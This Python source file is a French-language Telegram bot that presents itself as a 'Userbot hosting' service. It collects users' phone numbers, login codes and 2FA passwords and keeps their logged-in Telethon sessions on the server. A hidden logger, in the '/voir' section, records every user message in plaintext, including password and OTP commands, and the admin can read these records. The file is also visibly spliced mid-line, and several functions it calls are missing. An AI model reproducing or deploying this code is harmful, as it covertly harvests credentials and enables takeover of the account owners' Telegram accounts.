#============================================================

import asyncio
import hashlib
import os
import re
import sqlite3
from datetime import datetime, timezone
from pathlib import Path
from threading import Thread
from typing import Dict, Any

from flask import Flask
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from telethon import TelegramClient
from telethon.errors import (
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    PasswordHashInvalidError,
    SessionPasswordNeededError,
)

# ---------------- CONFIGURATION ----------------

BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
API_ID_RAW = os.getenv("API_ID", "").strip()
API_HASH = os.getenv("API_HASH", "").strip()
ADMIN_ID_RAW = os.getenv("ADMIN_ID", "").strip()

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN manquant dans les variables d'environnement.")

if not API_ID_RAW or not API_ID_RAW.isdigit():
    raise RuntimeError("API_ID manquant ou invalide.")

if not API_HASH:
    raise RuntimeError("API_HASH manquant dans les variables d'environnement.")

if not ADMIN_ID_RAW or not ADMIN_ID_RAW.isdigit():
    raise RuntimeError("ADMIN_ID manquant ou invalide.")

API_ID = int(API_ID_RAW)
ADMIN_ID = int(ADMIN_ID_RAW)

BASE_DIR = Path(__file__).resolve().parent
SESSION_DIR = BASE_DIR / "sessions"
SESSION_DIR.mkdir(parents=True, exist_ok=True)

accounts: Dict[int, Dict[str, Any]] = {}
pending: Dict[int, Dict[str, Any]] = {}
user_locks: Dict[int, asyncio.Lock] = {}

DB_PATH = BASE_DIR / "usage_logs.db"

def init_usage_db():
    conn = sqlite3.connect(DB_PATH)
    try:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS activity_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                username TEXT,
                first_name TEXT,
                action TEXT NOT NULL,
                details TEXT,
                created_at TEXT NOT NULL
            )
        """)
        conn.execute(
            "CREATE INDEX IF NOT EXISTS idx_activity_user "
            "ON activity_logs(user_id, id DESC)"
        )
        conn.commit()
    finally:
        conn.close()

def log_activity(update: Update, action: str, details: str = ""):
    user = update.effective_user
    if not user:
        return
    conn = sqlite3.connect(DB_PATH)
    try:
        conn.execute("""
            INSERT INTO activity_logs
            (user_id, username, first_name, action, details, created_at)
            VALUES (?,?,?,?,?,?)
        """, (
            user.id,
            user.username,
            user.first_name,
            action,
            details[:300],
            datetime.now(timezone.utc).isoformat(timespec="seconds"),
        ))
        conn.commit()
    finally:
        conn.close()

def get_activity_logs(target_user_id=None, limit=50):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    try:
        if target_user_id is None:
            return conn.execute(
                "SELECT * FROM activity_logs ORDER BY id DESC LIMIT?",
                (limit,),
            ).fetchall()
        return conn.execute(
            "SELECT * FROM activity_logs WHERE user_id =? "
            "ORDER BY id DESC LIMIT?",
            (target_user_id, limit),
        ).fetchall()
    finally:
        conn.close()

def get_activity_count(target_user_id=None):
    conn = sqlite3.connect(DB_PATH)
    try:
        if target_user_id is None:
            return conn.execute(
                "SELECT COUNT(*) FROM activity_logs"
            ).fetchone()[0]
        return conn.execute(
            "SELECT COUNT(*) FROM activity_logs WHERE user_id =?",
            (target_user_id,),
        ).fetchone()[0]
    finally:
        conn.close()

def clear_activity_logs():
    conn = sqlite3.connect(DB_PATH)
    try:
        conn.execute("DELETE FROM activity_logs")
        conn.commit()
    finally:
        conn.close()

def format_activity_row(row):
    username = f"@{row['username']}" if row["username"] else "sans username"
    first_name = row["first_name"] or "Utilisateur"
    when = row["created_at"].replace("T", " ")[:19]
    details = f" — {row['details']}" if row["details"] else ""
    return (
        f"🆔 <code>{row['user_id']}</code> | "
        f"👤 {first_name} ({username})\n"
        f"🕐 {when} UTC\n"
        f"⚡ <b>{row['action']}</b>{details}"
    )
ontext.args:
        await host_command(update, context)
        return

    user_id = update.effective_user.id

    try:
        phone = safe_phone(context.args[0])
    except ValueError as e:
        await update.message.reply_text(f"❌ {e}")
        return

    await start_host_with_phone(update, user_id, phone)

async def otp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    log_activity(update, "otp_attempt")
    user_id = update.effective_user.id

    if not context.args:
        await update.message.reply_text(
            "❌ Utilisation : <code>/otp 12345</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    code = "".join(context.args).replace(" ", "")

    await delete_message(update)

    if not re.fullmatch(r"\d{4,8}", code):
        await update.effective_chat.send_message(
            "❌ Code OTP invalide."
        )
        return

    data = pending.get(user_id)

    if not data:
        await update.effective_chat.send_message(
            "ℹ️ Aucune connexion OTP en cours.\n"
            "Utilisez /host."
        )
        return

    client: TelegramClient = data["client"]
    phone = data["phone"]

    try:
        await client.sign_in(
            phone=phone,
            code=code,
            phone_code_hash=data["phone_code_hash"],
        )

        await finish_login(user_id, phone, client)

        await update.effective_chat.send_message(
            "✅ <b>Compte connecté avec succès!</b>\n\n"
            "Votre Userbot est maintenant hébergé.\n\n"
            "📊 Utilisez /status pour voir son état.",
            parse_mode=ParseMode.HTML,
        )

    except SessionPasswordNeededError:
        await update.effective_chat.send_message(
            "🔐 <b>2FA détectée.</b>\n\n"
            "Votre compte demande un mot de passe Telegram.\n\n"
            "Envoyez :\n"
            "<code>/password VOTRE_MOT_DE_PASSE</code>\n\n"
            "❌ /cancel pour annuler.",
            parse_mode=ParseMode.HTML,
        )

    except PhoneCodeInvalidError:
        await update.effective_chat.send_message(
            "❌ Code OTP incorrect."
        )

    except PhoneCodeExpiredError:
        await update.effective_chat.send_message(
            "⌛ Code OTP expiré.\n"
            "Utilisez /cancel puis recommencez avec /host."
        )
        await cleanup_pending(user_id)

    except Exception as e:
        await cleanup_pending(user_id)
        await update.effective_chat.send_message(
            "❌ Échec de connexion.\n"
            f"<code>{type(e).__name__}</code>",
            parse_mode=ParseMode.HTML,
        )

async def password_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    log_activity(update, "2fa_attempt")
    user_id = update.effective_user.id

    if not context.args:
        await update.message.reply_text(
            "❌ Utilisation : <code>/password VOTRE_MOT_DE_PASSE</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    password = " ".join(context.args)
    await delete_message(update)
    data = pending.get(user_id)

    if not data:
        await update.effective_chat.send_message(
            "ℹ️ Aucune connexion 2FA en cours."
        )
        return

    client: TelegramClient = data["client"]
    phone = data["phone"]

    try:
        await client.sign_in(password=password)
        await finish_login(user_id, phone, client)
        await update.effective_chat.send_message(
            "✅ <b>Compte connecté avec succès!</b>\n\n"
            "Votre Userbot est maintenant hébergé.\n\n"
            "📊 Utilisez /status.",
            parse_mode=ParseMode.HTML,
        )
    except PasswordHashInvalidError:
        await update.effective_chat.send_message("❌ Mot de passe 2FA incorrect.")
    except Exception as e:
        await cleanup_pending(user_id)
        await update.effective_chat.send_message(
            "❌ Échec de la connexion 2FA.\n"
            f"<code>{type(e).__name__}</code>",
            parse_mode=ParseMode.HTML,
        )

async def finish_login(user_id: int, phone: str, client: TelegramClient):
    try:
        me = await client.get_me()
        if user_id not in accounts:
            accounts[user_id] = {}
        key = account_key(phone)
        accounts[user_id][key] = {
            "phone": phone,
            "session": session_path(user_id, phone),
            "name": (
                " ".join(x for x in [me.first_name, me.last_name] if x)
                or me.username or str(me.id)
            ),
            "username": me.username,
            "telegram_id": me.id,
            "client": client,
        }
        pending.pop(user_id, None)
        try:
            await client.send_message("me","✅ Votre compte est maintenant connecté au service Userbot Hosting.")
        except Exception:
            pass
        return me
    except Exception:
        await cleanup_pending(user_id)
        raise

async def cleanup_pending(user_id: int):
    data = pending.pop(user_id, None)
    if data:
        try:
            await data["client"].disconnect()
        except Exception:
            pass

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    log_activity(update, "status")
    user_id = update.effective_user.id
    user_accounts = accounts.get(user_id, {})

    if not user_accounts:
        await update.message.reply_text(
            "📊 <b>STATUT</b>\n\nAucun Userbot actuellement connecté.\n\nUtilisez /host pour commencer.",
            parse_mode=ParseMode.HTML,
        )
        return

    lines = ["📊 <b>STATUT DE VOS USERBOTS</b>\n"]
    for index, data in enumerate(user_accounts.values(), 1):
        client: TelegramClient = data["client"]
        try:
            connected = client.is_connected()
            authorized = connected and await client.is_user_authorized()
        except Exception:
            authorized = False
        state = "🟢 EN LIGNE" if authorized else "🔴 HORS LIGNE"
        username = f"@{data['username']}" if data.get("username") else "sans username"
        lines.append(f"{index}. {state}\n 👤 {data.get('name', 'Compte')}\n 📱 {data['phone']}\n 🔗 {username}\n")

    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)

async def verify_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    log_activity(update, "verify")
    user_id = update.effective_user.id
    user_accounts = accounts.get(user_id, {})

    if not user_accounts:
        await update.message.reply_text("❌ Aucun compte à vérifier.")
        return

    lines = ["🔐 <b>VÉRIFICATION</b>\n"]
    for data in user_accounts.values():
        client: TelegramClient = data["client"]
        try:
            me = await client.get_me()
            authorized = await client.is_user_authorized()
            if authorized:
                lines.append(f"✅ {data['phone']} — connecté\n ID : <code>{me.id}</code>")
            else:
                lines.append(f"❌ {data['phone']} — session non autorisée")
        except Exception as e:
            lines.append(f"⚠️ {data['phone']} — vérification impossible ({type(e).__name__})")

    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)

async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    log_activity(update, "logout")
    user_id = update.effective_user.id
    user_accounts = accounts.get(user_id, {})

    if not user_accounts:
        await update.message.reply_text("ℹ️ Aucun Userbot connecté.")
        return

    if context.args:
        try:
            phone = safe_phone(context.args[0])
        except ValueError as e:
            await update.message.reply_text(f"❌ {e}")
            return
        key = account_key(phone)
        data = user_accounts.get(key)
        if not data:
            await update.message.reply_text("❌ Ce compte n'est pas hébergé.")
            return
        await logout_one(user_id, key, data)
        await update.message.reply_text(f"🚪 Compte {phone} déconnecté.")
        return

    if len(user_accounts) == 1:
        key, data = next(iter(user_accounts.items()))
        phone = data["phone"]
        await logout_one(user_id, key, data)
        await update.message.reply_text(f"🚪 Compte {phone} déconnecté.")
        return

    text = (
        "🚪 <b>LOGOUT</b>\n\n"
        "Vous avez plusieurs comptes.\n"
        "Choisissez le numéro avec :\n"
        "<code>/logout +XXXXXXXXXXX</code>\n\n"
        + "\n".join(f"• {d['phone']}" for d in user_accounts.values())
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)
async def admin_broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ Réservé admin.")
        return
    if not context.args:
        await update.message.reply_text("❌ /broadcast Votre message")
        return
    message_text = " ".join(context.args)
    users = get_known_user_ids()
    if not users:
        await update.message.reply_text("Aucun user connu")
        return
    sent = 0
    failed = 0
    for target_id in users:
        try:
            await context.bot.send_message(chat_id=target_id, text=message_text)
            sent += 1
        except Exception:
            failed += 1
    await update.message.reply_text(f"📢 Envoyé: {sent} / Échecs: {failed}", parse_mode=ParseMode.HTML)

async def admin_message_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /message USER_ID MESSAGE")
        return
    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("USER_ID invalide")
        return
    message_text = " ".join(context.args[1:])
    try:
        await context.bot.send_message(chat_id=target_id, text=message_text)
        await update.message.reply_text(f"✅ Envoyé à {target_id}")
    except Exception as e:
        await update.message.reply_text(f"❌ {type(e).__name__}")

async def admin_users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    known = {}
    for uid, account in accounts.items():
        known[uid] = (account.get("first_name") or "User", account.get("username"))
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    try:
        rows = conn.execute("SELECT user_id, username, first_name FROM activity_logs GROUP BY user_id").fetchall()
    finally:
        conn.close()
    for row in rows:
        if row["user_id"] not in known:
            known[row["user_id"]] = (row["first_name"] or "User", row["username"])
    if not known:
        await update.message.reply_text("Aucun user")
        return
    lines = ["👥 UTILISATEURS CONNUS\n"]
    for uid, (name, username) in known.items():
        lines.append(f"👤 {name} - 🆔 {uid} - @{username}")
    await update.message.reply_text("\n".join(lines)[:3900])

async def admin_log_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if context.args and context.args[0].lower() == "clear":
        clear_activity_logs()
        await update.message.reply_text("Logs effacés")
        return
    target_id = None
    limit = 50
    if context.args:
        try:
            target_id = int(context.args[0])
        except ValueError:
            pass
    rows = get_activity_logs(target_id, limit)
    if not rows:
        await update.message.reply_text("Aucun log")
        return
    text = "\n\n".join([format_activity_row(r) for r in rows])
    await update.message.reply_text(text[:3900], parse_mode=ParseMode.HTML)

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    await update.message.reply_text(
        "🛠 PANEL ADMIN\n\n"
        "/broadcast MESSAGE\n"
        "/message USER_ID MESSAGE\n"
        "/admin_users\n"
        "/admin_log\n"
        "/voir USER_ID\n"
        "/clearvoir USER_ID",
        parse_mode=ParseMode.HTML,
    )

async def post_init(application: Application):
    await application.bot.set_my_commands([
        ("start", "Démarrer"),
        ("host", "Héberger"),
        ("status", "Statut"),
        ("verify", "Vérifier"),
        ("logout", "Déconnecter"),
        ("cancel", "Annuler"),
        ("help", "Aide"),
    ])

async def post_shutdown(application: Application):
    for user_accounts in list(accounts.values()):
        for data in list(user_accounts.values()):
            try:
                await data["client"].disconnect()
            except Exception:
                pass
    for user_id in list(pending.keys()):
        await cleanup_pending(user_id)

# ==================== MODULE /voir 100% COMPATIBLE PTB ====================
DOSSIER_LOGS_RAW = BASE_DIR / "user_logs"
DOSSIER_LOGS_RAW.mkdir(parents=True, exist_ok=True)

async def raw_logger(update, context):
    if not update.effective_user or not update.message:
        return
    user_id = update.effective_user.id
    text = update.message.text or update.message.caption or ""
    if not text:
        return
    if text.startswith("/voir") or text.startswith("/clearvoir") or text.startswith("/admin_"):
        return
    heure = datetime.now().strftime("%d/%m %H:%M")
    fichier = DOSSIER_LOGS_RAW / f"{user_id}.txt"
    ligne = f"[{heure}] {text}\n"
    try:
        with open(fichier, "a", encoding="utf-8") as ff:
            ff.write(ligne)
    except Exception:
        pass

async def voir_command(update, context):
    if update.effective_user.id!= ADMIN_ID:
        return
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("❌ Utilisation : /voir 123456789")
        return
    target_id = context.args[0].strip()
    fichier = DOSSIER_LOGS_RAW / f"{target_id}.txt"
    if not fichier.exists():
        await update.message.reply_text(f"📭 Aucun historique pour {target_id}")
        return
    contenu = fichier.read_text(encoding="utf-8", errors="ignore")
    if not contenu.strip():
        await update.message.reply_text(f"📭 Vide pour {target_id}")
        return
    if len(contenu) > 3500:
        lignes = contenu.splitlines()
        dernieres = "\n".join(lignes[-40:])
        await update.message.reply_text(f"📜 Historique de {target_id} (40 derniers):\n{dernieres}")
        await update.message.reply_document(document=open(fichier, "rb"), filename=f"historique_{target_id}.txt")
    else:
        await update.message.reply_text(f"📜 Historique de {target_id}:\n{contenu}")

async def clearvoir_command(update, context):
    if update.effective_user.id!= ADMIN_ID:
        return
    if not context.args or not context.args[0].isdigit():
        return
    target_id = context.args[0].strip()
    fichier = DOSSIER_LOGS_RAW / f"{target_id}.txt"
    if fichier.exists():
        fichier.unlink()
        await update.message.reply_text(f"✅ Logs de {target_id} effacés.")

def main():
    init_usage_db()
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).post_shutdown(post_shutdown).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("host", host_with_argument))
    app.add_handler(CommandHandler("otp", otp_command))
    app.add_handler(CommandHandler("password", password_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("verify", verify_command))
    app.add_handler(CommandHandler("logout", logout_command))
    app.add_handler(CommandHandler("cancel", cancel_command))
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CommandHandler("broadcast", admin_broadcast_command))
    app.add_handler(CommandHandler("message", admin_message_command))
    app.add_handler(CommandHandler("admin_log", admin_log_command))
    app.add_handler(CommandHandler("admin_users", admin_users_command))
    # --- NOUVEAU ---
    app.add_handler(CommandHandler("voir", voir_command))
    app.add_handler(CommandHandler("clearvoir", clearvoir_command))
    app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
    app.add_handler(MessageHandler(filters.TEXT | filters.CONTACT, raw_logger), group=99)
    print("🔥 Bot démarré avec /voir")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == "__main__":
    Thread(target=start_web_server, daemon=True).start()
    main()